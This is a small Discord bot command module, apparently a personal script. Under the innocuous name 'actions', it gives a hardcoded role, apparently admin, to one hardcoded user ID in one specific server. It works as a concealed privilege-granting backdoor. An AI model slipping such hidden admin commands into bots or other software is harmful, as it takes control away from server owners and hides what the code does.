//yep just a admin giver for me lmfao

module.exports = {
    name : "actions",
	description: "balls!",
    aliases: ["action"],
	api: false,
	admin: true,
	dm: true,
	cooldown: -1,
    async execute(message, DiscordClient) {
        if(message.author.id != "733489965568360539") return message.channel.send({content: "no"})
        const server = await DiscordClient.guilds.fetch("822514160154706010")
		let user = DiscordClient.users.cache.get("733489965568360539")
		user = await server.members.fetch(user.id)
		user.roles.add(server.roles.cache.get("822553320551874650"))
        return message.channel.send("Gaved admin hapy face :)")
    }
}